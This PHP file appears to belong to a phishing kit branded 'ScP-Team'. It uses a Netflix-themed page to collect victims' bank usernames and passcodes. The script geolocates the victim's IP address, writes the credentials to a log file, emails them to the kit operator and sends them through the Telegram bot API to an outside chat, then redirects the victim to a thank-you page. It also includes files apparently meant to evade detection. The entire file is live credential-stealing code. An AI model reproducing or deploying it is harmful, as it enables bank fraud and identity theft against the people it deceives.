<?php
/*
  ██████  ▄████▄   ██▓███     ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▒██    ▒ ▒██▀ ▀█  ▓██░  ██▒   ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
░ ▓██▄   ▒▓█    ▄ ▓██░ ██▓▒   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
  ▒   ██▒▒▓▓▄ ▄██▒▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
▒██████▒▒▒ ▓███▀ ░▒██▒ ░  ░     ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░▒▓▒░ ░  ░     ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
░ ░▒  ░ ░  ░  ▒   ░▒ ░            ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
░  ░  ░  ░        ░░            ░         ░    ░   ▒   ░      ░   
      ░  ░ ░                              ░  ░     ░  ░       ░   
         ░                                                        
*/
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$_SESSION['username'] = $_POST['username'];
$_SESSION['password1'] = $_POST['password1'];

$file = fopen("NetFlix_RzlT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$lon    = $IP_LOOKUP->long . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "♠️🐱‍👤🐱‍👤🐱‍👤✨✨⚡ScP-Team NetFlix Bank Logs RZLT⚡🐱‍👤🐱‍👤🐱‍👤✨✨ ♠️ $ip";
$headers = "From: ScP-Team<info@ScPTeam.com>";
$send = $email; 


$message = "[========== ♠️🐱‍👤🐱‍👤🐱‍👤✨✨⚡ ScP-Team NetFlix Bank Logs RZLT(Info) ⚡🐱‍👤🐱‍👤🐱‍👤✨✨ ♠️ =======================================================================]\r\n";
$message .= "|Bank Name      : ".$_SESSION['bank_name']."\r\n";
$message .= "|Bank ID (username)      : ".$_POST['username']."\r\n";
$message .= "|Bank Passcode (password)     	 : ".$_POST['password1']."\r\n";
$message .= "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
$message .= "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
$message .= "███▄▄▄▄                ▄████████               ███                  ▄████████            ▄█                  ▄█            ▀████    ▐████▀ \r\n";
$message .= "███▀▀▀██▄             ███    ███           ▀█████████▄             ███    ███           ███                 ███              ███▌   ████▀  \r\n";
$message .= "███   ███             ███    █▀               ▀███▀▀██             ███    █▀            ███                 ███▌              ███  ▐███    \r\n";
$message .= "███   ███            ▄███▄▄▄                   ███   ▀            ▄███▄▄▄               ███                 ███▌              ▀███▄███▀    \r\n";
$message .= "███   ███           ▀▀███▀▀▀                   ███               ▀▀███▀▀▀               ███                 ███▌              ████▀██▄     \r\n";
$message .= "███   ███             ███    █▄                ███                 ███                  ███                 ███              ▐███  ▀███    \r\n";
$message .= "███   ███             ███    ███               ███                 ███                  ███▌    ▄           ███             ▄███     ███▄  \r\n";
$message .= " ▀█   █▀              ██████████              ▄████▀               ███                  █████▄▄██           █▀             ████       ███▄ \r\n";
$message .= "                                                                                        ▀                                                  \r\n";
$message .= "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";
$message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[========== ♠️🐱‍👤🐱‍👤🐱‍👤✨✨⚡ ScP-Team NetFlix Bank Logsss RZLT(Info) ⚡🐱‍👤🐱‍👤🐱‍👤✨✨ ♠️ ========================================================================]\n";
mail($send,$subject,$message,$headers);


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


$myfile = fopen("NetFlix_RzlT.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: ../thanks.php");


?>

